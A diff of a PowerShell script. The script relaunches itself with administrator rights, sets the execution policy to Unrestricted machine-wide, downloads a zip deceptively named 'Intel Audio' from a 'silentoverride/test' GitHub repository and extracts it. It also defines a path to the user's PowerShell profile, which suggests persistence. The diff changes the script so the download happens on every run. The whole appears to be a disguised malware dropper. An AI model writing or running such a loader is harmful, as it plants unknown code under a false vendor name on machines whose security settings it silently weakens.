@@ -1,5 +1,3 @@
-#Clear-Host
-# Self-elevate the script if required
 if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
       if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
             $CommandLine = "-NoExit -c cd '$pwd'; & `"" + $MyInvocation.MyCommand.Path + "`""
@@ -18,8 +16,9 @@ $TargetZip = "$TargetPath\Intel Audio.zip"
 $PowershellPath = "$env:USERPROFILE\Documents\WindowsPowerShell"
 $PowershellFile = "$PowershellPath\Microsoft.PowerShell_profile.ps1"
 
-Set-ExecutionPolicy Unrestricted -Scope LocalMachine
-Set-ExecutionPolicy Unrestricted -Scope CurrentUser
+Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine
+Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+Get-ExecutionPolicy -List
 
 if (-Not (Test-Path $FolderPath)) {
       New-Item -ItemType Directory -Force -Path $FolderPath
@@ -31,12 +30,13 @@ if (-Not (Test-Path $TargetPath)) {
       Write-Output "Target folder created"
 }
 
+Invoke-WebRequest -Uri "https://github.com/silentoverride/test/raw/refs/heads/main/dist/Intel Audio.zip" -OutFile $TargetZip
+Write-Output "File downloaded"
+
 if (-Not (Test-Path $TargetFile)) {
-      Invoke-WebRequest -Uri "https://github.com/silentoverride/test/raw/refs/heads/main/dist/Intel Audio.zip" -OutFile $TargetZip
-      Write-Output "File downloaded"
       Expand-Archive -Path $TargetZip -DestinationPath $TargetPath
       Write-Output "File extracted"
-      Remove-Item -Path $TargetZip -Force
+      Remove-Item -Path $TargetZip
       Write-Output "Zip file removed"
 }
 
